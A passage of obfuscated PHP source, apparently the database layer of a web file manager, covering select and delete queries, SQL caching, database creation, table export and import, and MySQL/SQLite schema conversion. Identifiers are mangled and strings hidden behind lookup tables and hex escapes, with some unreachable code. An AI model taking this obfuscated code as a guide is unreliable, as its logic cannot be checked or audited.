$Ùİ°ó»[$ùÃ°ãëÆ[363]] : array())); } public function delete($¦¯ÜùÊê = array()) { $êÁ¬ÉÑ =& $_SERVER[´‹ô¯Œ]; $this->model = $¦¯ÜùÊê[$êÁ¬ÉÑ[361]]; $Ò±ŒÖÓ£ = $êÁ¬ÉÑ[1134] . $this->parseTable($¦¯ÜùÊê[$êÁ¬ÉÑ[359]]) . $this->parseWhere(!empty($¦¯ÜùÊê[$êÁ¬ÉÑ[355]]) ? $¦¯ÜùÊê[$êÁ¬ÉÑ[355]] : $êÁ¬ÉÑ[12]) . $this->parseOrder(!empty($¦¯ÜùÊê[$êÁ¬ÉÑ[444]]) ? $¦¯ÜùÊê[$êÁ¬ÉÑ[444]] : $êÁ¬ÉÑ[12]) . $this->parseLimit(!empty($¦¯ÜùÊê[$êÁ¬ÉÑ[370]]) ? $¦¯ÜùÊê[$êÁ¬ÉÑ[370]] : $êÁ¬ÉÑ[12]) . $this->parseLock(isset($¦¯ÜùÊê[$êÁ¬ÉÑ[935]]) ? $¦¯ÜùÊê[$êÁ¬ÉÑ[935]] : !1) . $this->parseComment(!empty($¦¯ÜùÊê[$êÁ¬ÉÑ[432]]) ? $¦¯ÜùÊê[$êÁ¬ÉÑ[432]] : $êÁ¬ÉÑ[12]); return $this->execute($Ò±ŒÖÓ£, $this->parseBind(!empty($¦¯ÜùÊê[$êÁ¬ÉÑ[363]]) ? $¦¯ÜùÊê[$êÁ¬ÉÑ[363]] : array())); } public function select($—¦ú‘©Æ = array()) { $Ô†ß—×ü =& $_SERVER[´‹ô¯Œ]; $this->model = $—¦ú‘©Æ[$Ô†ß—×ü[361]]; $Ïí¹ÍñÈ = $this->buildSelectSql($—¦ú‘©Æ); $¡à°ù¡û = isset($—¦ú‘©Æ[$Ô†ß—×ü[427]]) ? $—¦ú‘©Æ[$Ô†ß—×ü[427]] : !1; if ($¡à°ù¡û) { $€†ÔÕÛ = is_string($¡à°ù¡û[$Ô†ß—×ü[97]]) ? $¡à°ù¡û[$Ô†ß—×ü[97]] : $Ô†ß—×ü[1135] . md5($Ïí¹ÍñÈ); $ƒŸ¾óå = think_cache($€†ÔÕÛ, $Ô†ß—×ü[12], $¡à°ù¡û); if (!1 !== $ƒŸ¾óå) { return $ƒŸ¾óå; } } $æ©ä½à» = $this->query($Ïí¹ÍñÈ, $this->parseBind(!empty($—¦ú‘©Æ[$Ô†ß—×ü[363]]) ? $—¦ú‘©Æ[$Ô†ß—×ü[363]] : array())); if ($¡à°ù¡û && !1 !== $æ©ä½à») { think_cache($€†ÔÕÛ, $æ©ä½à», $¡à°ù¡û); } return $æ©ä½à»; } public function buildSelectSql($êæ³Âıø = array()) { $Ñ°Šœ—ë =& $_SERVER[´‹ô¯Œ]; if (isset($êæ³Âıø[$Ñ°Šœ—ë[431]])) { if (strpos($êæ³Âıø[$Ñ°Šœ—ë[431]], $Ñ°Šœ—ë[50])) { list($éÒàßûÉ, $÷¡İˆ³¶) = explode($Ñ°Šœ—ë[50], $êæ³Âıø[$Ñ°Šœ—ë[431]]); } else { $éÒàßûÉ = $êæ³Âıø[$Ñ°Šœ—ë[431]]; } $éÒàßûÉ = $éÒàßûÉ ? $éÒàßûÉ : 1; $÷¡İˆ³¶ = isset($÷¡İˆ³¶) ? $÷¡İˆ³¶ : (is_numeric($êæ³Âıø[$Ñ°Šœ—ë[370]]) ? $êæ³Âıø[$Ñ°Šœ—ë[370]] : 20); $™ù½ééå = $÷¡İˆ³¶ * ((int) $éÒàßûÉ - 1); $êæ³Âıø[$Ñ°Šœ—ë[370]] = $™ù½ééå . $Ñ°Šœ—ë[50] . $÷¡İˆ³¶; } if (think_config($Ñ°Šœ—ë[1136])) { $Îù…Ø¨ = $Ñ°Šœ—ë[1137] . md5(serialize($êæ³Âıø)); $ó»‘ç¯ = think_cache($Îù…Ø¨); if ($ó»‘ç¯) { return $ó»‘ç¯; } } $›âš•é = $this->parseSql($this->selectSql, $êæ³Âıø); $›âš•é .= $this->parseLock(isset($êæ³Âıø[$Ñ°Šœ—ë[935]]) ? $êæ³Âıø[$Ñ°Šœ—ë[935]] : !1); if (isset($Îù…Ø¨)) { think_cache($Îù…Ø¨, $›âš•é); } return $›âš•é; } public function parseSql($ŠáŞï´, $³ê¡é˜Ö = array()) { $ÌïøÁÏ =& $_SERVER[´‹ô¯Œ]; $ŠáŞï´ = str_replace(array($ÌïøÁÏ[1138], $ÌïøÁÏ[1139], $ÌïøÁÏ[1140], $ÌïøÁÏ[1141], $ÌïøÁÏ[1142], $ÌïøÁÏ[1143], $ÌïøÁÏ[1144], $ÌïøÁÏ[1145], $ÌïøÁÏ[1146], $ÌïøÁÏ[1147], $ÌïøÁÏ[1148]), array($this->parseTable("{$³ê¡é˜Ö[$ÌïøÁÏ[359]]}"), $this->parseDistinct(isset($³ê¡é˜Ö[$ÌïøÁÏ[1149]]) ? $³ê¡é˜Ö[$ÌïøÁÏ[1149]] : !1), $this->parseField(!empty($³ê¡é˜Ö[$ÌïøÁÏ[353]]) ? $³ê¡é˜Ö[$ÌïøÁÏ[353]] : $ÌïøÁÏ[223]), $this->parseJoin(!empty($³ê¡é˜Ö[$ÌïøÁÏ[362]]) ? $³ê¡é˜Ö[$ÌïøÁÏ[362]] : $ÌïøÁÏ[12]), $this->parseWhere(!empty($³ê¡é˜Ö[$ÌïøÁÏ[355]]) ? $³ê¡é˜Ö[$ÌïøÁÏ[355]] : $ÌïøÁÏ[12]), $this->parseGroup(!empty($³ê¡é˜Ö[$ÌïøÁÏ[592]]) ? $³ê¡é˜Ö[$ÌïøÁÏ[592]] : $ÌïøÁÏ[12]), $this->parseHaving(!empty($³ê¡é˜Ö[$ÌïøÁÏ[1150]]) ? $³ê¡é˜Ö[$ÌïøÁÏ[1150]] : $ÌïøÁÏ[12]), $this->parseOrder(!empty($³ê¡é˜Ö[$ÌïøÁÏ[444]]) ? $³ê¡é˜Ö[$ÌïøÁÏ[444]] : $ÌïøÁÏ[12]), $this->parseLimit(!empty($³ê¡é˜Ö[$ÌïøÁÏ[370]]) ? $³ê¡é˜Ö[$ÌïøÁÏ[370]] : $ÌïøÁÏ[12]), $this->parseUnion(!empty($³ê¡é˜Ö[$ÌïøÁÏ[425]]) ? $³ê¡é˜Ö[$ÌïøÁÏ[425]] : $ÌïøÁÏ[12]), $this->parseComment(!empty($³ê¡é˜Ö[$ÌïøÁÏ[432]]) ? $³ê¡é˜Ö[$ÌïøÁÏ[432]] : $ÌïøÁÏ[12])), $ŠáŞï´); return $ŠáŞï´; } public function getLastSql($Ûå‚ş¼¥ = '') { return $Ûå‚ş¼¥ ? $this->modelSql[$Ûå‚ş¼¥] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($»ÄÁá‡») { return addslashes($»ÄÁá‡»); } public function setModel($È»­¡ŸŒ) { $this->model = $È»­¡ŸŒ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Û˜âû… = array()) { $Ó˜áå”ô =& $_SERVER[´‹ô¯Œ]; if (empty($Û˜âû…)) { $Û˜âû… = $GLOBALS[$Ó˜áå”ô[6]][$Ó˜áå”ô[21]]; } $this->database = $Û˜âû…; } public function model($ŠÅ¡˜¾¾ = '') { return new ModelBase($ŠÅ¡˜¾¾, $_SERVER[´‹ô¯Œ][12], $this->database); } public function db($ÄŒÔ–Àê = false) { $ğ‚°©—œ =& $_SERVER[´‹ô¯Œ]; $¼ÕĞı÷Í = array_change_key_case($this->database); if ($this->dbType() == $ğ‚°©—œ[13] || !$ÄŒÔ–Àê) { return $this->model()->db(); } $ƒÎ‚ÙÕ¼ = $¼ÕĞı÷Í[$ğ‚°©—œ[1064]]; $¼ÕĞı÷Í[$ğ‚°©—œ[1064]] = $ğ‚°©—œ[12]; if ($¼ÕĞı÷Í[$ğ‚°©—œ[1059]] == $ğ‚°©—œ[1056]) { $…‹¨Ğïæ = $¼ÕĞı÷Í[$ğ‚°©—œ[1065]]; $¼ÕĞı÷Í[$ğ‚°©—œ[1065]] = substr($…‹¨Ğïæ, 0, strrpos($…‹¨Ğïæ, $ğ‚°©—œ[1151])); } $this->database = $¼ÕĞı÷Í; $ãåöà» = $this->model()->db(); try { $ÆÓ©™¨™ = $ãåöà»->execute("\x73\x68\157\x77\x20\x64\141\164\141\x62\x61\x73\x65\163\40\154\151\x6b\x65\40\47{$ƒÎ‚ÙÕ¼}\x27"); } catch (Exception $Ò•åá¿) { } if (!$ÆÓ©™¨™) { $ãåöà»->execute("\143\x72\x65\141\164\145\40\144\141\164\x61\x62\x61\163\145\x20\140{$ƒÎ‚ÙÕ¼}\x60"); } $¼ÕĞı÷Í[$ğ‚°©—œ[1064]] = $ƒÎ‚ÙÕ¼; if ($¼ÕĞı÷Í[$ğ‚°©—œ[1059]] == $ğ‚°©—œ[1056]) { $¼ÕĞı÷Í[$ğ‚°©—œ[1065]] .= $ğ‚°©—œ[1151] . $ƒÎ‚ÙÕ¼; } $this->database = $¼ÕĞı÷Í; $ãåöà»->execute("\165\163\x65\40\140{$ƒÎ‚ÙÕ¼}\140"); return $ãåöà»; } public function createTable($Ê³˜ëóä, &$ ´ÒèÀ) { $÷»áá„Ú =& $_SERVER[´‹ô¯Œ]; if (!IO::exist($Ê³˜ëóä)) { ActionCall($÷»áá„Ú[1152], !0, 0); show_json(LNG($÷»áá„Ú[1153]), !1); } $çÉ«å· = $this->model()->db(); $Íß²›ó = sqlSplit(IO::getContent($Ê³˜ëóä)); foreach ($Íß²›ó as $¦ŞÛ) { $ÙÄùŞ§Á = stripos($¦ŞÛ, $÷»áá„Ú[1154]) === 0; if ($ÙÄùŞ§Á) { $ ´ÒèÀ->task[$÷»áá„Ú[1155]] += 1; } $çÉ«å·->execute($¦ŞÛ); if ($ÙÄùŞ§Á) { preg_match($÷»áá„Ú[1156], $¦ŞÛ, $Ä²—“œ¯); $ ´ÒèÀ->task[$÷»áá„Ú[1157]] = $Ä²—“œ¯[1]; $ ´ÒèÀ->update(1); } } } public function insertTable($ıñúúßİ, &$íâèı ‡) { $òÛ¹¥ôç =& $_SERVER[´‹ô¯Œ]; $ÆÉíÈÓà = $this->model()->db(); $Õ¥İœÅ¨ = $½¶ëÜ×ò ? array($½¶ëÜ×ò) : $ÆÉíÈÓà->getTables(); foreach ($ıñúúßİ as $¨´’¤ÕŸ) { $½¶ëÜ×ò = basename($¨´’¤ÕŸ, $òÛ¹¥ôç[876]); if (!in_array($½¶ëÜ×ò, $Õ¥İœÅ¨)) { continue; } $íâèı ‡->task[$òÛ¹¥ôç[1157]] = $½¶ëÜ×ò; if (get_filesize($¨´’¤ÕŸ) == 0) { continue; } $ä¥É±¯ = $this->sqlToDb($¨´’¤ÕŸ, $íâèı ‡); if (!$ä¥É±¯) { ActionCall($òÛ¹¥ôç[1152], !0, 0); show_json(LNG($òÛ¹¥ôç[1158]) . "\133{$½¶ëÜ×ò}\135", !1); } } } public function sqlFromDb($ŞÖ·ƒŠ‘, $ÕÇºèÙº, &$Ğ™Š»ğ, $¯Û¿ §ˆ = '') { if ($Ğ™Š»ğ) { $Ğ™Š»ğ->task[$_SERVER[´‹ô¯Œ][1157]] = $ŞÖ·ƒŠ‘; } $ú…˜‡÷­ = $this->model($ŞÖ·ƒŠ‘); $ûœæÅµå = 0; $´ì»Â×Ã = 0; $‚–¶à‚ó = 10000; $¯°˜–Êğ = fopen($ÕÇºèÙº, $_SERVER[´‹ô¯Œ][1159]); $‚™æÌ³• = $ú…˜‡÷­->getPk(); $¹•€í®Ö = $ú…˜‡÷­->getDbFields(); $ª¹à¶ = $_SERVER[´‹ô¯Œ][12]; if ($GLOBALS[$_SERVER[´‹ô¯Œ][875]] && in_array($ŞÖ·ƒŠ‘, array($_SERVER[´‹ô¯Œ][1160], $_SERVER[´‹ô¯Œ][1161]))) { $ª¹à¶ = $ŞÖ·ƒŠ‘; } do { $ô–êÅ  = array($‚™æÌ³• => array($_SERVER[´‹ô¯Œ][1106], $´ì»Â×Ã)); $†ŠÍ‚´õ = $ú…˜‡÷­->where($ô–êÅ )->field($¹•€í®Ö)->order($‚™æÌ³• . $_SERVER[´‹ô¯Œ][1162])->limit($‚–¶à‚ó)->select(); $†ŠÍ‚´õ = !empty($†ŠÍ‚´õ) ? $†ŠÍ‚´õ : array(); if (!($ıóñÏ·¹ = count($†ŠÍ‚´õ))) { break; } $ ş¨õâœ = end($†ŠÍ‚´õ); $´ì»Â×Ã = $ ş¨õâœ[$‚™æÌ³•]; $Ä—–Ûè½ = array(); foreach ($†ŠÍ‚´õ as $­´Óì¦Ñ) { if ($ª¹à¶) { if ($ŞÖ·ƒŠ‘ == $_SERVER[´‹ô¯Œ][1160]) { if ($­´Óì¦Ñ[$_SERVER[´‹ô¯Œ][33]] == $_SERVER[´‹ô¯Œ][1163]) { $˜¦ÊÂ¯ = json_decode($­´Óì¦Ñ[$_SERVER[´‹ô¯Œ][453]], !0); if ($˜¦ÊÂ¯[$_SERVER[´‹ô¯Œ][32]] == $GLOBALS[$_SERVER[´‹ô¯Œ][875]] && $˜¦ÊÂ¯[$_SERVER[´‹ô¯Œ][836]] != 1) { continue; } } } else { if ($­´Óì¦Ñ[$_SERVER[´‹ô¯Œ][33]] == $_SERVER[´‹ô¯Œ][1164] && $­´Óì¦Ñ[$_SERVER[´‹ô¯Œ][97]] == $_SERVER[´‹ô¯Œ][871]) { continue; } } } if ($¯Û¿ §ˆ) { $­´Óì¦Ñ[$_SERVER[´‹ô¯Œ][87]] = "\173\x69\157\72{$¯Û¿ §ˆ}\x7d" . substr($­´Óì¦Ñ[$_SERVER[´‹ô¯Œ][87]], strlen("\x7b\151\x6f\72{$­´Óì¦Ñ[$_SERVER[´‹ô¯Œ][909]]}\x7d")); $­´Óì¦Ñ[$_SERVER[´‹ô¯Œ][909]] = $¯Û¿ §ˆ; } $Ä—–Ûè½[] = $_SERVER[´‹ô¯Œ][1165] . $this->sqlEncode($­´Óì¦Ñ) . $_SERVER[´‹ô¯Œ][1166]; } $§Êúä® = "\111\x4e\x53\105\122\x54\x20\x49\x4e\124\117\x20\140{$ŞÖ·ƒŠ‘}\140\x20\50\x60" . implode($_SERVER[´‹ô¯Œ][1167], $¹•€í®Ö) . $_SERVER[´‹ô¯Œ][1168]; fwrite($¯°˜–Êğ, $§Êúä® . implode($_SERVER[´‹ô¯Œ][1169], $Ä—–Ûè½) . $_SERVER[´‹ô¯Œ][74] . PHP_EOL); $ûœæÅµå += $ıóñÏ·¹; if ($Ğ™Š»ğ) { $Ğ™Š»ğ->update($ıóñÏ·¹); } } while ($‚–¶à‚ó == $ıóñÏ·¹); fclose($¯°˜–Êğ); return $ûœæÅµå; } public function sqlToDb($é¡´‘é , &$¼»ô¹µÑ) { $ñª³¤ =& $_SERVER[´‹ô¯Œ]; $«¹µË¯â = $this->model()->db(); $ÜÍ¥Ó‰³ = @fopen($é¡´‘é , $ñª³¤[1170]); if (!$ÜÍ¥Ó‰³) { return !1; } $°†µ¢ = 0; $­Áåá¿Ü = $ñª³¤[12]; $úÕ½”¹² = array(); $ãß¨Ú¬ = $this->dbType(); $à“‡æ = $ãß¨Ú¬ == $ñª³¤[13] ? 500 : 2000; $Í¢ìÈÏŒ = basename($é¡´‘é , $ñª³¤[876]); $­‰çŠ£Ü = 0; $ø¦ªĞÏÕ = 4194304; while (!feof($ÜÍ¥Ó‰³)) { $òËÖ¹Í† = trim(fgets($ÜÍ¥Ó‰³)); if (!$òËÖ¹Í†) { continue; } $–ãû¼Ëï = $this->sqlDecode($òËÖ¹Í†, $ãß¨Ú¬, $Í¢ìÈÏŒ); if (stripos($–ãû¼Ëï, $ñª³¤[433]) === 0) { if (!$­Áåá¿Ü) { $­Áåá¿Ü = $–ãû¼Ëï . $ñª³¤[53]; } continue; } if ($¼»ô¹µÑ) { $¼»ô¹µÑ->task[$ñª³¤[1155]] += 1; } $°†µ¢++; $úÕ½”¹²[] = rtrim(rtrim(trim($–ãû¼Ëï), $ñª³¤[50]), $ñª³¤[74]); $ó¶õÂÚ = null; $şŒÀßÆ¸ = strlen($–ãû¼Ëï); $­‰çŠ£Ü += $şŒÀßÆ¸; $æ„İ¡Œ¦ = strlen($­Áåá¿Ü) + $­‰çŠ£Ü + (count($úÕ½”¹²) - 1); if ($æ„İ¡Œ¦ >= $ø¦ªĞÏÕ) { $ó¶õÂÚ = array_pop($úÕ½”¹²); if ($°†µ¢ > 1) { $°†µ¢--; } } if ($°†µ¢ >= $à“‡æ || $ó¶õÂÚ) { $–ãû¼Ëï = $­Áåá¿Ü . implode($ñª³¤[50], $úÕ½”¹²); if (!$«¹µË¯â->execute($–ãû¼Ëï)) { return !1; } if ($¼»ô¹µÑ) { $¼»ô¹µÑ->update($°†µ¢); } $úÕ½”¹² = array(); $°†µ¢ = 0; $­‰çŠ£Ü = 0; if ($ó¶õÂÚ) { $úÕ½”¹² = array($ó¶õÂÚ); $°†µ¢ = 1; $­‰çŠ£Ü = $şŒÀßÆ¸; } } } fclose($ÜÍ¥Ó‰³); if (!empty($úÕ½”¹²)) { $–ãû¼Ëï = $­Áåá¿Ü . implode($ñª³¤[50], $úÕ½”¹²); if (!$«¹µË¯â->execute($–ãû¼Ëï)) { return !1; } if ($¼»ô¹µÑ) { $¼»ô¹µÑ->update($°†µ¢); } } return !0; } public function dropTable($Ç–Ò’ªÆ = null) { $ÕÁ†ã™ = $this->model()->db(); $¾€®Ò«õ = $Ç–Ò’ªÆ ? array($Ç–Ò’ªÆ) : $ÕÁ†ã™->getTables(); if (!$¾€®Ò«õ) { return; } foreach ($¾€®Ò«õ as $Ç–Ò’ªÆ) { if ($Ç–Ò’ªÆ) { $Ç–Ò’ªÆ = strtolower($Ç–Ò’ªÆ); } else { continue; } $ÕÁ†ã™->execute("\144\x72\157\160\x20\164\141\142\x6c\145\x20\151\x66\x20\145\170\151\163\x74\x73\40\x60{$Ç–Ò’ªÆ}\140"); } } private function sqlEncode($—åòò¤º) { $ŠºæŠ­Å =& $_SERVER[´‹ô¯Œ]; $ÕªÛß©» = array(); foreach ($—åòò¤º as $ªĞ¥ãäˆ) { if (is_array($ªĞ¥ãäˆ)) { $ªĞ¥ãäˆ = json_encode_force($ªĞ¥ãäˆ); } $ªĞ¥ãäˆ = addslashes($ªĞ¥ãäˆ); $ªĞ¥ãäˆ = str_replace(array($ŠºæŠ­Å[1171], $ŠºæŠ­Å[288], $ŠºæŠ­Å[420]), array($ŠºæŠ­Å[1172], $ŠºæŠ­Å[1173], $ŠºæŠ­Å[1174]), $ªĞ¥ãäˆ); $ÕªÛß©»[] = $ªĞ¥ãäˆ; } return $ŠºæŠ­Å[58] . implode($ŠºæŠ­Å[1175], $ÕªÛß©») . $ŠºæŠ­Å[58]; } private function sqlDecode($ôÔ¨¶, $ß¯ÛäÙ±, $ƒ÷‘»¸ƒ = '') { $÷ñÀÎÛÍ =& $_SERVER[´‹ô¯Œ]; $ôÔ¨¶ = str_replace(array($÷ñÀÎÛÍ[1172], $÷ñÀÎÛÍ[1173], $÷ñÀÎÛÍ[1174]), array($÷ñÀÎÛÍ[1171], $÷ñÀÎÛÍ[288], $÷ñÀÎÛÍ[420]), $ôÔ¨¶); if ($ß¯ÛäÙ± == $÷ñÀÎÛÍ[13]) { $ôÔ¨¶ = str_ireplace($÷ñÀÎÛÍ[1176], $÷ñÀÎÛÍ[59], $ôÔ¨¶); $ôÔ¨¶ = stripslashes($ôÔ¨¶); } return preg_replace($÷ñÀÎÛÍ[1177], $÷ñÀÎÛÍ[12], $ôÔ¨¶); if ($ß¯ÛäÙ± == $÷ñÀÎÛÍ[13]) { return $ƒ÷‘»¸ƒ != $÷ñÀÎÛÍ[870] ? stripslashes($ôÔ¨¶) : $ôÔ¨¶; } if ($ƒ÷‘»¸ƒ == $÷ñÀÎÛÍ[870]) { $ôÔ¨¶ = str_replace($÷ñÀÎÛÍ[1178], $÷ñÀÎÛÍ[121], stripslashes($ôÔ¨¶)); } return $ôÔ¨¶; } public function getSqlFile($µ—Ûµ÷² = '') { $”¡ëŒ«š =& $_SERVER[´‹ô¯Œ]; $ğı‚Ù” = $this->dbType(!0); $Äîöä¼è = CONTROLLER_DIR . "\151\156\x73\x74\x61\x6c\x6c\57\x64\141\164\x61\57{$ğı‚Ù”}\56\163\x71\154"; $œ­ªğŠğ = file_get_contents($Äîöä¼è); $Ô¸ËäË¸ = $”¡ëŒ«š[1179] . ($ğı‚Ù” == $”¡ëŒ«š[894] ? $”¡ëŒ«š[1180] : $”¡ëŒ«š[1181]) . $”¡ëŒ«š[1182]; preg_match_all($Ô¸ËäË¸, $œ­ªğŠğ, $œé™÷¡); $ÉÛë”º = $œé™÷¡[1]; $œ…şù¸ˆ = $this->model()->db(); $´Ñ…å´ê = $œ…şù¸ˆ->getTables(); $î¯‡Ø™Ü = TEMP_FILES . $”¡ëŒ«š[1183] . date($”¡ëŒ«š[262]) . $”¡ëŒ«š[8]; del_dir($î¯‡Ø™Ü); mk_dir($î¯‡Ø™Ü); $…íÕÒ™µ = $î¯‡Ø™Ü . $”¡ëŒ«š[1184]; $¿‘ŸÁ°ã = $î¯‡Ø™Ü . $”¡ëŒ«š[1185]; $©™ÅôŸç = $ğı‚Ù” == $”¡ëŒ«š[13] ? $”¡ëŒ«š[894] : $”¡ëŒ«š[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\x73\164\141\154\154\57\x64\141\x74\x61\x2f{$©™ÅôŸç}\56\163\x71\154", $î¯‡Ø™Ü); @touch($î¯‡Ø™Ü . $ğı‚Ù” . $”¡ëŒ«š[876]); $Üæ÷»ªÃ = fopen($…íÕÒ™µ, $”¡ëŒ«š[1159]); $Û±ğ£… = fopen($¿‘ŸÁ°ã, $”¡ëŒ«š[1159]); if ($ğı‚Ù” == $”¡ëŒ«š[13]) { $´Ñ…å´ê = array_diff($´Ñ…å´ê, array($”¡ëŒ«š[868], $”¡ëŒ«š[869])); $ö¶¹÷Æã = array($”¡ëŒ«š[1186], $”¡ëŒ«š[1187], $”¡ëŒ«š[1188]); fwrite($Û±ğ£…, implode(PHP_EOL, $ö¶¹÷Æã) . PHP_EOL . PHP_EOL); foreach ($´Ñ…å´ê as $îÅà§Ş«) { $İÎÅìã¥ = $this->sqlFromSqlite($îÅà§Ş«); if (!$İÎÅìã¥[$”¡ëŒ«š[13]]) { continue; } fwrite($Û±ğ£…, $İÎÅìã¥[$”¡ëŒ«š[13]] . PHP_EOL . PHP_EOL); if (!in_array($îÅà§Ş«, $ÉÛë”º)) { fwrite($Üæ÷»ªÃ, $İÎÅìã¥[$”¡ëŒ«š[894]] . PHP_EOL . PHP_EOL); } } } else { foreach ($´Ñ…å´ê as $îÅà§Ş«) { $İÎÅìã¥ = $this->sqlFromMysql($îÅà§Ş«); if (!$İÎÅìã¥[$”¡ëŒ«š[894]]) { continue; } fwrite($Üæ÷»ªÃ, $İÎÅìã¥[$”¡ëŒ«š[894]] . PHP_EOL . PHP_EOL); if (!in_array($îÅà§Ş«, $ÉÛë”º)) { fwrite($Û±ğ£…, $İÎÅìã¥[$”¡ëŒ«š[13]] . PHP_EOL . PHP_EOL); } } } fclose($Üæ÷»ªÃ); fclose($Û±ğ£…); $œ­ªğŠğ = array($”¡ëŒ«š[894] => $…íÕÒ™µ, $”¡ëŒ«š[13] => $¿‘ŸÁ°ã); return $µ—Ûµ÷² ? $œ­ªğŠğ[$µ—Ûµ÷²] : $œ­ªğŠğ; } public function dbType($ùÙš¾ç¬ = false) { $ê°³¸ŒÑ =& $_SERVER[´‹ô¯Œ]; $³˜ËüË = $ùÙš¾ç¬ ? $GLOBALS[$ê°³¸ŒÑ[6]][$ê°³¸ŒÑ[21]] : $this->database; $³˜ËüË = array_change_key_case($³˜ËüË); $õî”íœ´ = $³˜ËüË[$ê°³¸ŒÑ[1059]]; if ($õî”íœ´ == $ê°³¸ŒÑ[1056]) { $ÕüÑÊä = explode($ê°³¸ŒÑ[4], $³˜ËüË[$ê°³¸ŒÑ[1065]]); $õî”íœ´ = $ÕüÑÊä[0]; } $¸ùñİ¶Ç = array($ê°³¸ŒÑ[1189] => $ê°³¸ŒÑ[13], $ê°³¸ŒÑ[1004] => $ê°³¸ŒÑ[894]); if (isset($¸ùñİ¶Ç[$õî”íœ´])) { $õî”íœ´ = $¸ùñİ¶Ç[$õî”íœ´]; } return $õî”íœ´; } public function sqlFromMysql($£ø²çğä, $øìŒºô = '') { $©Ë‚ÂÏ² =& $_SERVER[´‹ô¯Œ]; $àø©€¸ = $this->model()->db(); $¨˜¥¾èû = $àø©€¸->query($©Ë‚ÂÏ²[1190] . $£ø²çğä . $©Ë‚ÂÏ²[464]); if (!$¨˜¥¾èû || !$¨˜¥¾èû[0]) { return !1; } $ŞÛ÷ñ = _get($¨˜¥¾èû[0], $©Ë‚ÂÏ²[1191], $©Ë‚ÂÏ²[12]); if (!$ŞÛ÷ñ) { return !1; } $ı‹»ç‚ç = "\104\x52\x4f\x50\40\124\x41\x42\x4c\105\x20\111\x46\x20\x45\130\111\123\x54\x53\x20\140{$£ø²çğä}\140\x3b" . PHP_EOL . $ŞÛ÷ñ . $©Ë‚ÂÏ²[74]; if ($øìŒºô && $øìŒºô == $©Ë‚ÂÏ²[894]) { return $ı‹»ç‚ç; } $˜Ÿõµ = array_change_key_case($GLOBALS[$©Ë‚ÂÏ²[6]][$©Ë‚ÂÏ²[21]]); $¥’ÆŒÏ = $˜Ÿõµ[$©Ë‚ÂÏ²[1064]]; $¨’ÇŸ÷ = $©Ë‚ÂÏ²[1192] . $¥’ÆŒÏ . $©Ë‚ÂÏ²[1193] . $£ø²çğä . $©Ë‚ÂÏ²[58]; $‚‹ù˜ôâ = $©Ë‚ÂÏ²[1194] . $£ø²çğä . $©Ë‚ÂÏ²[992]; $¶ƒ¢³‡İ = $àø©€¸->query($¨’ÇŸ÷); if (empty($¶ƒ¢³‡İ)) { $¨ÄÎ¦–ø = array($©Ë‚ÂÏ²[894] => $©Ë‚ÂÏ²[12], $©Ë‚ÂÏ²[13] => $©Ë‚ÂÏ²[12]); return $øìŒºô ? $¨ÄÎ¦–ø[$øìŒºô] : $¨ÄÎ¦–ø; } $Ø²÷Ç©‘ = $àø©€¸->query($‚‹ù˜ôâ); $ÚôŒ›«î = $©Ë‚ÂÏ²[12]; $Àä‚•Íã = array(); foreach ($Ø²÷Ç©‘ as $úŠäÆïØ) { if (!$ÚôŒ›«î && $úŠäÆïØ[$©Ë‚ÂÏ²[1195]] == $©Ë‚ÂÏ²[1196]) { $ÚôŒ›«î = $úŠäÆïØ[$©Ë‚ÂÏ²[1197]]; } if (isset($Àä‚•Íã[$úŠäÆïØ[$©Ë‚ÂÏ²[1195]]])) { $Àä‚•Íã[$úŠäÆïØ[$©Ë‚ÂÏ²[1195]]][$©Ë‚ÂÏ²[1198]][] = $úŠäÆïØ[$©Ë‚ÂÏ²[1197]]; continue; } $Àä‚•Íã[$úŠäÆïØ[$©Ë‚ÂÏ²[1195]]] = array($©Ë‚ÂÏ²[1199] => $úŠäÆïØ[$©Ë‚ÂÏ²[1195]], $©Ë‚ÂÏ²[1198] => array($úŠäÆïØ[$©Ë‚ÂÏ²[1197]]), $©Ë‚ÂÏ²[1200] => $úŠäÆïØ[$©Ë‚ÂÏ²[1201]] == $©Ë‚ÂÏ²[91] ? 0 : 1); } $Û¶ØÅ‰» = array(); foreach ($Àä‚•Íã as $úŠäÆïØ) { $Î±øÂµ¡ = $úŠäÆïØ[$©Ë‚ÂÏ²[1199]] == $©Ë‚ÂÏ²[1196]; $éÇÛöš = array($©Ë‚ÂÏ²[1202], $úŠäÆïØ[$©Ë‚ÂÏ²[1200]] == $©Ë‚ÂÏ²[91] && !$Î±øÂµ¡ ? $©Ë‚ÂÏ²[1203] : $©Ë‚ÂÏ²[12], $©Ë‚ÂÏ²[1204], $©Ë‚ÂÏ²[1205] . $£ø²çğä . $©Ë‚ÂÏ²[11] . ($Î±øÂµ¡ ? $©Ë‚ÂÏ²[1206] : $úŠäÆïØ[$©Ë‚ÂÏ²[1199]]) . $©Ë‚ÂÏ²[121], $©Ë‚ÂÏ²[1207], $©Ë‚ÂÏ²[121] . $£ø²çğä . $©Ë‚ÂÏ²[121], $©Ë‚ÂÏ²[1208] . implode($©Ë‚ÂÏ²[1209], $úŠäÆïØ[$©Ë‚ÂÏ²[1198]]) . $©Ë‚ÂÏ²[1210]); $Û¶ØÅ‰»[] = implode($©Ë‚ÂÏ²[53], $éÇÛöš) . $©Ë‚ÂÏ²[74]; } $ÖÀÍºŞÌ = array(); $ØÅàª‹ê = array($©Ë‚ÂÏ²[1211] => $©Ë‚ÂÏ²[1212], $©Ë‚ÂÏ²[1212] => $©Ë‚ÂÏ²[1212], $©Ë‚ÂÏ²[366] => $©Ë‚ÂÏ²[393], $©Ë‚ÂÏ²[365] => $©Ë‚ÂÏ²[393]); foreach ($¶ƒ¢³‡İ as $úŠäÆïØ) { $éÇÛöš = array($©Ë‚ÂÏ²[121] . $úŠäÆïØ[$©Ë‚ÂÏ²[1213]] . $©Ë‚ÂÏ²[121], isset($ØÅàª‹ê[$úŠäÆïØ[$©Ë‚ÂÏ²[1214]]]) ? $ØÅàª‹ê[$úŠäÆïØ[$©Ë‚ÂÏ²[1214]]] : $úŠäÆïØ[$©Ë‚ÂÏ²[1215]], $úŠäÆïØ[$©Ë‚ÂÏ²[1216]] == $©Ë‚ÂÏ²[990] ? $©Ë‚ÂÏ²[1217] : $©Ë‚ÂÏ²[1218], $úŠäÆïØ[$©Ë‚ÂÏ²[1213]] == $ÚôŒ›«î ? $©Ë‚ÂÏ²[1219] : 